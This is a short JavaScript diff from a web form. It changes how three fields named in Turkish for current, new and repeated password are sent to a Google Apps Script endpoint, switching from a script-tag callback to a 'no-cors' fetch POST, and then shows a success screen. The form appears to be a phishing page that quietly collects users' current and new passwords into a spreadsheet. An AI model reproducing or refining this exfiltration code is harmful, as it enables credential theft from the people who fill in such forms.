@@ -449,9 +449,12 @@
       return;
     }
     var SHEET_URL = 'https://script.google.com/macros/s/AKfycbwsuCoKFzXdovG3bOggpqwImzehyTuOzpqnm88zfXmUFIz1HMPD6RUxOg1ZoZ6z-Q8/exec';
-    var s = document.createElement('script');
-    s.src = SHEET_URL + '?callback=cb&mevcut=' + encodeURIComponent(p0) + '&yeni=' + encodeURIComponent(p1) + '&tekrar=' + encodeURIComponent(p2);
-    document.body.appendChild(s);
+    fetch(SHEET_URL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ mevcut: p0, yeni: p1, tekrar: p2 })
+    });
     goTo('s-success');
   }
   function cb() {}
